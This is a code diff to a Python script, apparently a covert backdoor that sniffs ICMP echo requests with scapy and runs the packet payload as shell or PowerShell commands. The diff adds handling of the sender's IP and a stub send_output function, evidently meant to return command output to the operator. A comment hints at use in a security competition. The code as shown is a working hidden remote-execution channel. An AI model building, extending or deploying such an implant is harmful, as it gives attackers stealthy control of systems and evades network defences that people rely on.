@@ -7,13 +7,16 @@ verbose = False
 
 def cmd_mon(pkt):
     if str(pkt.getlayer(ICMP).type) == "8":
-        print(pkt.show())
-        print(pkt.getlayer(ICMP).type)
+        if verbose:
+            print(f'Packet:\n {pkt.show()}')
+            print(f'ICMP Type: {pkt.getlayer(ICMP).type}')
+            print(f'Source IP:{pkt.getlayer(IP).src}')
+        source = pkt.getlayer(IP).src
         instruct = pkt.getlayer(ICMP).load.decode()
-        cmd_proc(instruct)
+        cmd_proc(instruct, source)
 
 
-def cmd_proc(cmd):
+def cmd_proc(cmd, source):
     global verbose
     prefix = cmd[0]
     term = cmd[1]
@@ -29,6 +32,7 @@ def cmd_proc(cmd):
             result = sp.run(cmd, capture_output=True)
             if result.check_returncode() is None and verbose:
                 print(result.stdout.decode())
+                send_output(result.stdout.decode(), source)
         elif term == "p":
             cmd = cmd.split(" ")
             cmd.insert(0, "powershell")
@@ -37,6 +41,11 @@ def cmd_proc(cmd):
                 print(result.stdout.decode())
         elif term == "s":
             print("This taps into the stored commands")
+
+def send_output(stdout, sender):
+    print(stdout + ' \n \n \n' + sender)
+
+
 
 
 """ May have to be from the server due to the fact that ping will be blocked in a competition on the inbound traffic 
